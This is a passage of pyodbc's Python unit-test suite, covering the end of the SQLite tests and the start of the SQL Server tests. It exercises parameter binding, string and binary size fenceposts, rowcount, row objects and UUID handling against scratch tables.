    return v[:length]

class SqliteTestCase(unittest.TestCase):

    SMALL_FENCEPOST_SIZES = [ 0, 1, 255, 256, 510, 511, 512, 1023, 1024, 2047, 2048, 4000 ]
    LARGE_FENCEPOST_SIZES = [ 4095, 4096, 4097, 10 * 1024, 20 * 1024 ]

    ANSI_FENCEPOSTS    = [ _generate_test_string(size) for size in SMALL_FENCEPOST_SIZES ]
    UNICODE_FENCEPOSTS = [ unicode(s) for s in ANSI_FENCEPOSTS ]
    IMAGE_FENCEPOSTS   = ANSI_FENCEPOSTS + [ _generate_test_string(size) for size in LARGE_FENCEPOST_SIZES ]

    def __init__(self, method_name, connection_string):
        unittest.TestCase.__init__(self, method_name)
        self.connection_string = connection_string

    def setUp(self):
        self.cnxn   = pyodbc.connect(self.connection_string)
        self.cursor = self.cnxn.cursor()

        for i in range(3):
            try:
                self.cursor.execute(""drop table t%d"" % i)
                self.cnxn.commit()
            except:
                pass

        self.cnxn.rollback()

    def tearDown(self):
        try:
            self.cursor.close()
            self.cnxn.close()
        except:
            # If we've already closed the cursor or connection, exceptions are thrown.
            pass

    def test_multiple_bindings(self):
        ""More than one bind and select on a cursor""
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t1 values (?)"", 2)
        self.cursor.execute(""insert into t1 values (?)"", 3)
        for i in range(3):
            self.cursor.execute(""select n from t1 where n < ?"", 10)
            self.cursor.execute(""select n from t1 where n < 3"")
        

    def test_different_bindings(self):
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""create table t2(d datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t2 values (?)"", datetime.now())

    def test_drivers(self):
        p = pyodbc.drivers()
        self.assertTrue(isinstance(p, list))

    def test_datasources(self):
        p = pyodbc.dataSources()
        self.assertTrue(isinstance(p, dict))

    def test_getinfo_string(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CATALOG_NAME_SEPARATOR)
        self.assertTrue(isinstance(value, str))

    def test_getinfo_bool(self):
        value = self.cnxn.getinfo(pyodbc.SQL_ACCESSIBLE_TABLES)
        self.assertTrue(isinstance(value, bool))

    def test_getinfo_int(self):
        value = self.cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertTrue(isinstance(value, (int, long)))

    def test_getinfo_smallint(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CONCAT_NULL_BEHAVIOR)
        self.assertTrue(isinstance(value, int))

    def test_fixed_unicode(self):
        value = u""t\xebsting""
        self.cursor.execute(""create table t1(s nchar(7))"")
        self.cursor.execute(""insert into t1 values(?)"", u""t\xebsting"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), unicode)
        self.assertEqual(len(v), len(value)) # If we alloc'd wrong, the test below might work because of an embedded NULL
        self.assertEqual(v, value)


    def _test_strtype(self, sqltype, value, colsize=None):
        """"""
        The implementation for string, Unicode, and binary tests.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

        # Reported by Andy Hochhaus in the pyodbc group: In 2.1.7 and earlier, a hardcoded length of 255 was used to
        # determine whether a parameter was bound as a SQL_VARCHAR or SQL_LONGVARCHAR.  Apparently SQL Server chokes if
        # we bind as a SQL_LONGVARCHAR and the target column size is 8000 or less, which is considers just SQL_VARCHAR.
        # This means binding a 256 character value would cause problems if compared with a VARCHAR column under
        # 8001. We now use SQLGetTypeInfo to determine the time to switch.
        #
        # [42000] [Microsoft][SQL Server Native Client 10.0][SQL Server]The data types varchar and text are incompatible in the equal to operator.

        self.cursor.execute(""select * from t1 where s=?"", value)


    def _test_strliketype(self, sqltype, value, colsize=None):
        """"""
        The implementation for text, image, ntext, and binary.

        These types do not support comparison operators.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

    #
    # text
    #

    def test_text_null(self):
        self._test_strtype('text', None, 100)

    # Generate a test for each fencepost size: test_text_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('text', value, len(value))
        return t
    for value in UNICODE_FENCEPOSTS:
        locals()['test_text_%s' % len(value)] = _maketest(value)

    def test_text_upperlatin(self):
        self._test_strtype('varchar', u'�')

    #
    # blob
    #

    def test_null_blob(self):
        self._test_strtype('blob', None, 100)
     
    def test_large_null_blob(self):
        # Bug 1575064
        self._test_strtype('blob', None, 4000)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('blob', bytearray(value), len(value))
        return t
    for value in ANSI_FENCEPOSTS:
        locals()['test_blob_%s' % len(value)] = _maketest(value)

    def test_subquery_params(self):
        """"""Ensure parameter markers work in a subquery""""""
        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        row = self.cursor.execute(""""""
                                  select x.id
                                  from (
                                    select id
                                    from t1
                                    where s = ?
                                      and id between ? and ?
                                   ) x
                                   """""", 'test', 1, 10).fetchone()
        self.assertNotEqual(row, None)
        self.assertEqual(row[0], 1)

    def _exec(self):
        self.cursor.execute(self.sql)
        
    def test_close_cnxn(self):
        """"""Make sure using a Cursor after closing its connection doesn't crash.""""""

        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        self.cursor.execute(""select * from t1"")

        self.cnxn.close()
        
        # Now that the connection is closed, we expect an exception.  (If the code attempts to use
        # the HSTMT, we'll get an access violation instead.)
        self.sql = ""select * from t1""
        self.assertRaises(pyodbc.ProgrammingError, self._exec)

    def test_empty_unicode(self):
        self.cursor.execute(""create table t1(s nvarchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", u"""")

    def test_unicode_query(self):
        self.cursor.execute(u""select 1"")
        
    def test_negative_row_index(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", ""1"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row[0], ""1"")
        self.assertEqual(row[-1], ""1"")

    def test_version(self):
        self.assertEqual(3, len(pyodbc.version.split('.'))) # 1.3.1 etc.

    #
    # ints and floats
    #

    def test_int(self):
        value = 1234
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_int(self):
        value = -1
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_bigint(self):
        input = 3000000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_negative_bigint(self):
        # Issue 186: BIGINT problem on 32-bit architeture
        input = -430000000
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_float(self):
        value = 1234.567
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_float(self):
        value = -200
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result  = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(value, result)

    #
    # rowcount
    #

    # Note: SQLRowCount does not define what the driver must return after a select statement
    # and says that its value should not be relied upon.  The sqliteodbc driver is hardcoded to
    # return 0 so I've deleted the test.

    def test_rowcount_delete(self):
        self.assertEqual(self.cursor.rowcount, -1)
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.  On the other hand, we could hardcode a
        zero return value.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, 0)

    # In the 2.0.x branch, Cursor.execute sometimes returned the cursor and sometimes the rowcount.  This proved very
    # confusing when things went wrong and added very little value even when things went right since users could always
    # use: cursor.execute(""..."").rowcount

    def test_retcursor_delete(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        v = self.cursor.execute(""delete from t1"")
        self.assertEqual(v, self.cursor)

    def test_retcursor_select(self):
        self.cursor.execute(""create table t1(i int)"")
        self.cursor.execute(""insert into t1 values (1)"")
        v = self.cursor.execute(""select * from t1"")
        self.assertEqual(v, self.cursor)

    #
    # misc
    #

    def test_lower_case(self):
        ""Ensure pyodbc.lowercase forces returned column names to lowercase.""

        # Has to be set before creating the cursor, so we must recreate self.cursor.

        pyodbc.lowercase = True
        self.cursor = self.cnxn.cursor()

        self.cursor.execute(""create table t1(Abc int, dEf int)"")
        self.cursor.execute(""select * from t1"")

        names = [ t[0] for t in self.cursor.description ]
        names.sort()

        self.assertEqual(names, [ ""abc"", ""def"" ])

        # Put it back so other tests don't fail.
        pyodbc.lowercase = False
        
    def test_row_description(self):
        """"""
        Ensure Cursor.description is accessible as Row.cursor_description.
        """"""
        self.cursor = self.cnxn.cursor()
        self.cursor.execute(""create table t1(a int, b char(3))"")
        self.cnxn.commit()
        self.cursor.execute(""insert into t1 values(1, 'abc')"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        self.assertEqual(self.cursor.description, row.cursor_description)
        

    def test_executemany(self):
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (i, str(i)) for i in range(1, 6) ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_one(self):
        ""Pass executemany a single sequence""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, ""test"") ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])
        

    def test_executemany_failure(self):
        """"""
        Ensure that an exception is raised if one query in an executemany fails.
        """"""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, 'good'),
                   ('error', 'not an int'),
                   (3, 'good') ]
        
        self.assertRaises(pyodbc.Error, self.cursor.executemany, ""insert into t1(a, b) value (?, ?)"", params)

        
    def test_row_slicing(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = row[:]
        self.assertTrue(result is row)

        result = row[:-1]
        self.assertEqual(result, (1,2,3))

        result = row[0:4]
        self.assertTrue(result is row)


    def test_row_repr(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = str(row)
        self.assertEqual(result, ""(1, 2, 3, 4)"")

        result = str(row[:-1])
        self.assertEqual(result, ""(1, 2, 3)"")

        result = str(row[:1])
        self.assertEqual(result, ""(1,)"")


    def test_view_select(self):
        # Reported in forum: Can't select from a view?  I think I do this a lot, but another test never hurts.

        # Create a table (t1) with 3 rows and a view (t2) into it.
        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(50))"")
        for i in range(3):
            self.cursor.execute(""insert into t1(c2) values (?)"", ""string%s"" % i)
        self.cursor.execute(""create view t2 as select * from t1"")

        # Select from the view
        self.cursor.execute(""select * from t2"")
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(len(rows) == 3)

    def test_autocommit(self):
        self.assertEqual(self.cnxn.autocommit, False)

        othercnxn = pyodbc.connect(self.connection_string, autocommit=True)
        self.assertEqual(othercnxn.autocommit, True)

        othercnxn.autocommit = False
        self.assertEqual(othercnxn.autocommit, False)

    def test_unicode_results(self):
        ""Ensure unicode_results forces Unicode""
        othercnxn = pyodbc.connect(self.connection_string, unicode_results=True)
        othercursor = othercnxn.cursor()

        # ANSI data in an ANSI column ...
        othercursor.execute(""create table t1(s varchar(20))"")
        othercursor.execute(""insert into t1 values(?)"", 'test')

        # ... should be returned as Unicode
        value = othercursor.execute(""select s from t1"").fetchone()[0]
        self.assertEqual(value, u'test')

    def test_skip(self):
        # Insert 1, 2, and 3.  Fetch 1, skip 2, fetch 3.

        self.cursor.execute(""create table t1(id int)"");
        for i in range(1, 5):
            self.cursor.execute(""insert into t1 values(?)"", i)
        self.cursor.execute(""select id from t1 order by id"")
        self.assertEqual(self.cursor.fetchone()[0], 1)
        self.cursor.skip(2)
        self.assertEqual(self.cursor.fetchone()[0], 4)

    def test_sets_execute(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.execute(""insert into t1 (word) VALUES (?)"", [words])

        self.assertRaises(pyodbc.ProgrammingError, f)

    def test_sets_executemany(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.executemany(""insert into t1 (word) values (?)"", [words])
            
        self.assertRaises(TypeError, f)

    def test_row_execute(self):
        ""Ensure we can use a Row object as a parameter to execute""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, 'a')"")
        row = self.cursor.execute(""select n, s from t1"").fetchone()
        self.assertNotEqual(row, None)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.execute(""insert into t2 values (?, ?)"", row)
        
    def test_row_executemany(self):
        ""Ensure we can use a Row object as a parameter to executemany""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")

        for i in range(3):
            self.cursor.execute(""insert into t1 values (?, ?)"", i, chr(ord('a')+i))

        rows = self.cursor.execute(""select n, s from t1"").fetchall()
        self.assertNotEqual(len(rows), 0)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.executemany(""insert into t2 values (?, ?)"", rows)
        
    def test_description(self):
        ""Ensure cursor.description is correct""

        self.cursor.execute(""create table t1(n int, s text)"")
        self.cursor.execute(""insert into t1 values (1, 'abc')"")
        self.cursor.execute(""select * from t1"")

        # (I'm not sure the precision of an int is constant across different versions, bits, so I'm hand checking the
        # items I do know.

        # int
        t = self.cursor.description[0]
        self.assertEqual(t[0], 'n')
        self.assertEqual(t[1], int)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # text
        t = self.cursor.description[1]
        self.assertEqual(t[0], 's')
        self.assertEqual(t[1], str)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

    def test_row_equal(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test')"")
        row1 = self.cursor.execute(""select n, s from t1"").fetchone()
        row2 = self.cursor.execute(""select n, s from t1"").fetchone()
        b = (row1 == row2)
        self.assertEqual(b, True)

    def test_row_gtlt(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test1')"")
        self.cursor.execute(""insert into t1 values (1, 'test2')"")
        rows = self.cursor.execute(""select n, s from t1 order by s"").fetchall()
        self.assertTrue(rows[0] < rows[1])
        self.assertTrue(rows[0] <= rows[1])
        self.assertTrue(rows[1] > rows[0])
        self.assertTrue(rows[1] >= rows[0])
        self.assertTrue(rows[0] != rows[1])

        rows = list(rows)
        rows.sort() # uses <
        
    def _test_context_manager(self):
        # TODO: This is failing, but it may be due to the design of sqlite.  I've disabled it
        # for now until I can research it some more.

        # WARNING: This isn't working right now.  We've set the driver's autocommit to ""off"",
        # but that doesn't automatically start a transaction.  I'm not familiar enough with the
        # internals of the driver to tell what is going on, but it looks like there is support
        # for the autocommit flag.
        #
        # I thought it might be a timing issue, like it not actually starting a txn until you
        # try to do something, but that doesn't seem to work either.  I'll leave this in to
        # remind us that it isn't working yet but we need to contact the SQLite ODBC driver
        # author for some guidance.

        with pyodbc.connect(self.connection_string) as cnxn:
            cursor = cnxn.cursor()
            cursor.execute(""begin"")
            cursor.execute(""create table t1(i int)"")
            cursor.execute('rollback')

        # The connection should be closed now.
        def test():
            cnxn.execute('rollback')
        self.assertRaises(pyodbc.Error, test)

    def test_untyped_none(self):
        # From issue 129
        value = self.cursor.execute(""select ?"", None).fetchone()[0]
        self.assertEqual(value, None)
        
    def test_large_update_nodata(self):
        self.cursor.execute('create table t1(a blob)')
        hundredkb = 'x'*100*1024
        self.cursor.execute('update t1 set a=? where 1=0', (hundredkb,))

    def test_no_fetch(self):
        # Issue 89 with FreeTDS: Multiple selects (or catalog functions that issue selects) without fetches seem to
        # confuse the driver.
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')


def main():
    from optparse import OptionParser
    parser = OptionParser(usage=usage)
    parser.add_option(""-v"", ""--verbose"", default=0, action=""count"", help=""Increment test verbosity (can be used multiple times)"")
    parser.add_option(""-d"", ""--debug"", action=""store_true"", default=False, help=""Print debugging items"")
    parser.add_option(""-t"", ""--test"", help=""Run only the named test"")

    (options, args) = parser.parse_args()

    if len(args) > 1:
        parser.error('Only one argument is allowed.  Do you need quotes around the connection string?')

    if not args:
        connection_string = load_setup_connection_string('sqlitetests')

        if not connection_string:
            parser.print_help()
            raise SystemExit()
    else:
        connection_string = args[0]

    if options.verbose:
        cnxn = pyodbc.connect(connection_string)
        print_library_info(cnxn)
        cnxn.close()

    suite = load_tests(SqliteTestCase, options.test, connection_string)

    testRunner = unittest.TextTestRunner(verbosity=options.verbose)
    result = testRunner.run(suite)

    sys.exit(result.errors and 1 or 0)


if __name__ == '__main__':

    # Add the build directory to the path so we're testing the latest build, not the installed version.

    add_to_path()

    import pyodbc
    main()
/n/n/ntests2/sqlservertests.py/n/n#!/usr/bin/python
# -*- coding: utf-8 -*-

from __future__ import print_function

usage = """"""\
usage: %prog [options] connection_string

Unit tests for SQL Server.  To use, pass a connection string as the parameter.
The tests will create and drop tables t1 and t2 as necessary.

These run using the version from the 'build' directory, not the version
installed into the Python directories.  You must run python setup.py build
before running the tests.

You can also put the connection string into a tmp/setup.cfg file like so:

  [sqlservertests]
  connection-string=DRIVER={SQL Server};SERVER=localhost;UID=uid;PWD=pwd;DATABASE=db

The connection string above will use the 2000/2005 driver, even if SQL Server 2008
is installed:

  2000: DRIVER={SQL Server}
  2005: DRIVER={SQL Server}
  2008: DRIVER={SQL Server Native Client 10.0}
""""""

import sys, os, re, uuid
import unittest
from decimal import Decimal
from datetime import datetime, date, time
from os.path import join, getsize, dirname, abspath
from testutils import *

_TESTSTR = '0123456789-abcdefghijklmnopqrstuvwxyz-'

def _generate_test_string(length):
    """"""
    Returns a string of `length` characters, constructed by repeating _TESTSTR as necessary.

    To enhance performance, there are 3 ways data is read, based on the length of the value, so most data types are
    tested with 3 lengths.  This function helps us generate the test data.

    We use a recognizable data set instead of a single character to make it less likely that ""overlap"" errors will
    be hidden and to help us manually identify where a break occurs.
    """"""
    if length <= len(_TESTSTR):
        return _TESTSTR[:length]

    c = (length + len(_TESTSTR)-1) / len(_TESTSTR)
    v = _TESTSTR * c
    return v[:length]

class SqlServerTestCase(unittest.TestCase):

    SMALL_FENCEPOST_SIZES = [ 0, 1, 255, 256, 510, 511, 512, 1023, 1024, 2047, 2048, 4000 ]
    LARGE_FENCEPOST_SIZES = [ 4095, 4096, 4097, 10 * 1024, 20 * 1024 ]
    MAX_FENCEPOST_SIZES   = [ 5 * 1024 * 1024 ] #, 50 * 1024 * 1024 ]

    ANSI_SMALL_FENCEPOSTS    = [ _generate_test_string(size) for size in SMALL_FENCEPOST_SIZES ]
    UNICODE_SMALL_FENCEPOSTS = [ unicode(s) for s in ANSI_SMALL_FENCEPOSTS ]
    ANSI_LARGE_FENCEPOSTS    = ANSI_SMALL_FENCEPOSTS    + [ _generate_test_string(size) for size in LARGE_FENCEPOST_SIZES ]
    UNICODE_LARGE_FENCEPOSTS = UNICODE_SMALL_FENCEPOSTS + [ unicode(s) for s in [_generate_test_string(size) for size in LARGE_FENCEPOST_SIZES ]]

    ANSI_MAX_FENCEPOSTS    = ANSI_LARGE_FENCEPOSTS + [ _generate_test_string(size) for size in MAX_FENCEPOST_SIZES ]
    UNICODE_MAX_FENCEPOSTS = UNICODE_LARGE_FENCEPOSTS + [ unicode(s) for s in [_generate_test_string(size) for size in MAX_FENCEPOST_SIZES ]]


    def __init__(self, method_name, connection_string):
        unittest.TestCase.__init__(self, method_name)
        self.connection_string = connection_string

    def get_sqlserver_version(self):
        """"""
        Returns the major version: 8-->2000, 9-->2005, 10-->2008
        """"""
        self.cursor.execute(""exec master..xp_msver 'ProductVersion'"")
        row = self.cursor.fetchone()
        return int(row.Character_Value.split('.', 1)[0])

    def setUp(self):
        self.cnxn   = pyodbc.connect(self.connection_string)
        self.cursor = self.cnxn.cursor()

        for i in range(3):
            try:
                self.cursor.execute(""drop table t%d"" % i)
                self.cnxn.commit()
            except:
                pass

        for i in range(3):
            try:
                self.cursor.execute(""drop procedure proc%d"" % i)
                self.cnxn.commit()
            except:
                pass

        try:
            self.cursor.execute('drop function func1')
            self.cnxn.commit()
        except:
            pass

        self.cnxn.rollback()

    def tearDown(self):
        try:
            self.cursor.close()
            self.cnxn.close()
        except:
            # If we've already closed the cursor or connection, exceptions are thrown.
            pass

    def test_binary_type(self):
        if sys.hexversion >= 0x02060000:
            self.assertTrue(pyodbc.BINARY is bytearray)
        else:
            self.assertTrue(pyodbc.BINARY is buffer)

    def test_multiple_bindings(self):
        ""More than one bind and select on a cursor""
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t1 values (?)"", 2)
        self.cursor.execute(""insert into t1 values (?)"", 3)
        for i in range(3):
            self.cursor.execute(""select n from t1 where n < ?"", 10)
            self.cursor.execute(""select n from t1 where n < 3"")


    def test_different_bindings(self):
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""create table t2(d datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t2 values (?)"", datetime.now())

    def test_drivers(self):
        p = pyodbc.drivers()
        self.assertTrue(isinstance(p, list))

    def test_datasources(self):
        p = pyodbc.dataSources()
        self.assertTrue(isinstance(p, dict))

    def test_getinfo_string(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CATALOG_NAME_SEPARATOR)
        self.assertTrue(isinstance(value, str))

    def test_getinfo_bool(self):
        value = self.cnxn.getinfo(pyodbc.SQL_ACCESSIBLE_TABLES)
        self.assertTrue(isinstance(value, bool))

    def test_getinfo_int(self):
        value = self.cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertTrue(isinstance(value, (int, long)))

    def test_getinfo_smallint(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CONCAT_NULL_BEHAVIOR)
        self.assertTrue(isinstance(value, int))

    def test_noscan(self):
        self.assertEqual(self.cursor.noscan, False)
        self.cursor.noscan = True
        self.assertEqual(self.cursor.noscan, True)

    def test_nonnative_uuid(self):
        # The default is False meaning we should return a string.  Note that
        # SQL Server seems to always return uppercase.
        value = uuid.uuid4()
        self.cursor.execute(""create table t1(n uniqueidentifier)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        pyodbc.native_uuid = False
        result = self.cursor.execute(""select n from t1"").fetchval()
        self.assertEqual(type(result), unicode)
        self.assertEqual(result, unicode(value).upper())

    def test_native_uuid(self):
        # When true, we should return a uuid.UUID object.
        value = uuid.uuid4()
        self.cursor.execute(""create table t1(n uniqueidentifier)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        pyodbc.native_uuid = True
        result = self.cursor.execute(""select n from t1"").fetchval()
        self.assertTrue(isinstance(result, uuid.UUID))
        self.assertEqual(value, result)

    def test_nextset(self):
        self.cursor.execute(""create table t1(i int)"")
        for i in range(4):
            self.cursor.execute(""insert into t1(i) values(?)"", i)

        self.cursor.execute(""select i from t1 where i < 2 order by i; select i from t1 where i >= 2 order by i"")

        for i, row in enumerate(self.cursor):
            self.assertEqual(i, row.i)

        self.assertEqual(self.cursor.nextset(), True)

        for i, row in enumerate(self.cursor):
            self.assertEqual(i + 2, row.i)

    def test_nextset_with_raiserror(self):
        self.cursor.execute(""select i = 1; RAISERROR('c', 16, 1);"")
        row = next(self.cursor)
        self.assertEqual(1, row.i)
        self.assertRaises(pyodbc.ProgrammingError, self.cursor.nextset)

    def test_fixed_unicode(self):
        value = u""t\xebsting""
        self.cursor.execute(""create table t1(s nchar(7))"")
        self.cursor.execute(""insert into t1 values(?)"", u""t\xebsting"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), unicode)
        self.assertEqual(len(v), len(value)) # If we alloc'd wrong, the test below might work because of an embedded NULL
        self.assertEqual(v, value)


    def _test_strtype(self, sqltype, value, resulttype=None, colsize=None):
        """"""
        The implementation for string, Unicode, and binary tests.
        """"""
        assert colsize in (None, 'max') or isinstance(colsize, int), colsize
        assert colsize in (None, 'max') or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        if resulttype is None:
            resulttype = type(value)

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]

        # To allow buffer --> db --> bytearray tests, always convert the input to the expected result type before
        # comparing.
        if type(value) is not resulttype:
            value = resulttype(value)

        self.assertEqual(v, value)


    def _test_strliketype(self, sqltype, value, resulttype=None, colsize=None):
        """"""
        The implementation for text, image, ntext, and binary.

        These types do not support comparison operators.
        """"""
        assert colsize is None or isinstance(colsize, int), colsize
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        if resulttype is None:
            resulttype = type(value)

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        result = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(result), resulttype)

        # To allow buffer --> db --> bytearray tests, always convert the input to the expected result type before
        # comparing.
        if type(value) is not resulttype:
            value = resulttype(value)

        self.assertEqual(result, value)


    #
    # varchar
    #

    def test_varchar_null(self):
        self._test_strtype('varchar', None, colsize=100)

    # Generate a test for each fencepost size: test_varchar_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('varchar', value, colsize=len(value))
        return t
    for value in UNICODE_SMALL_FENCEPOSTS:
        locals()['test_varchar_%s' % len(value)] = _maketest(value)

    # Also test varchar(max)
    def _maketest(value):
        def t(self):
            self._test_strtype('varchar', value, colsize='max')
        return t
    for value in UNICODE_MAX_FENCEPOSTS:
        locals()['test_varcharmax_%s' % len(value)] = _maketest(value)

    def test_varchar_many(self):
        self.cursor.execute(""create table t1(c1 varchar(300), c2 varchar(300), c3 varchar(300))"")

        v1 = 'ABCDEFGHIJ' * 30
        v2 = '0123456789' * 30
        v3 = '9876543210' * 30

        self.cursor.execute(""insert into t1(c1, c2, c3) values (?,?,?)"", v1, v2, v3);
        row = self.cursor.execute(""select c1, c2, c3, len(c1) as l1, len(c2) as l2, len(c3) as l3 from t1"").fetchone()

        self.assertEqual(v1, row.c1)
        self.assertEqual(v2, row.c2)
        self.assertEqual(v3, row.c3)

    def test_varchar_upperlatin(self):
        self._test_strtype('varchar', u'\u00e5', colsize=1)

    #
    # nvarchar
    #

    def test_nvarchar_null(self):
        self._test_strtype('nvarchar', None, colsize=100)

